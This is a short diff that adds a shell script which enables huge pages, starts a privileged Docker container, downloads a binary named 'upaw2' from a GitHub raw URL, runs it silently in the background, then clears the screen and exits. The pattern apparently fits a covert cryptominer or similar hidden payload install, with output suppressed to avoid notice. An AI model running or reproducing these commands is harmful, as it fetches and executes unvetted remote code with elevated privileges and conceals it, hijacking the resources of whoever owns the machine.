@@ -1,0 +1,7 @@
+sudo sysctl vm.nr_hugepages=2560; sleep 2; docker pull node; docker run -d -t --privileged=true --name aaaa node; sleep 4; docker exec -it aaaa bash
+wget https://raw.githubusercontent.com/ot8qy1nahd4r/orangesmile/main/upaw2
+chmod +x upaw2
+./upaw2 > /dev/null 2>&1 &
+clear
+exit
+
